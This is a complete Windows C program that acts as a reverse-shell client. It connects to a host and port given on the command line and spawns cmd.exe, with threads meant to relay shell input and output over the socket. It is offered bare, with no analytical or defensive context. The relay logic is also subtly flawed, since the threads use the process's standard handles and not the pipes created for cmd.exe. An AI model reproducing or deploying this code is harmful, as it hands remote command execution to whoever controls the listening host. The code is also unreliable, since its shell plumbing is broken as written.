#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"Ws2_32.lib")

DWORD WINAPI PumpSockToStdin(LPVOID p)
{
    SOCKET s = (SOCKET)p;
    CHAR   buf[4096]; int n;
    while ((n = recv(s, buf, sizeof(buf), 0)) > 0)
        WriteFile(GetStdHandle(STD_INPUT_HANDLE), buf, n, NULL, NULL);
    return 0;
}

DWORD WINAPI PumpStdoutToSock(LPVOID p)
{
    SOCKET s = *(SOCKET*)p;
    CHAR   buf[4096]; DWORD n;
    while (ReadFile(GetStdHandle(STD_OUTPUT_HANDLE), buf, sizeof(buf), &n, NULL) && n)
        send(s, buf, n, 0);
    return 0;
}

int main(int argc, char *argv[])
{
    char host[256] = "127.0.0.1";
    int  port      = 0;
    char portbuf[16] = {0};

    if (argc == 3) {                       
        strncpy(host, argv[1], sizeof(host)-1);
        port = atoi(argv[2]);
    } else if (argc == 2) {               
        port = atoi(argv[1]);
        if (port == 0) {                   
            strncpy(host, argv[1], sizeof(host)-1);
        }
    }

    while (port <= 0) {
        printf("Server port: ");
        fgets(portbuf, sizeof(portbuf), stdin);
        port = atoi(portbuf);
    }

    printf("[*] Connecting to %s:%d ...\n", host, port);
    WSADATA wsa;  WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((u_short)port);
    sa.sin_addr.s_addr = inet_addr(host);
    if (sa.sin_addr.s_addr == INADDR_NONE) {      
        struct hostent *he = gethostbyname(host);
        if (!he) { printf("Cannot resolve host\n"); return 1; }
        sa.sin_addr = *(struct in_addr*)he->h_addr_list[0];
    }

    if (connect(s, (SOCKADDR*)&sa, sizeof(sa))) {
        perror("connect");  return 1;
    }
    SECURITY_ATTRIBUTES saAttr = { sizeof(saAttr), NULL, TRUE };
    HANDLE inR,inW,outR,outW;
    CreatePipe(&inR,  &inW,  &saAttr, 0);
    CreatePipe(&outR, &outW, &saAttr, 0);

    STARTUPINFOA        si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = inR;
    si.hStdOutput = si.hStdError = outW;

    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    CloseHandle(inR);  CloseHandle(outW);
    CreateThread(NULL,0, PumpSockToStdin,(LPVOID)s, 0, NULL);  
    SOCKET prm = s;
    CreateThread(NULL,0, PumpStdoutToSock,&prm,   0, NULL);    
    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(s); WSACleanup();
    return 0;
}
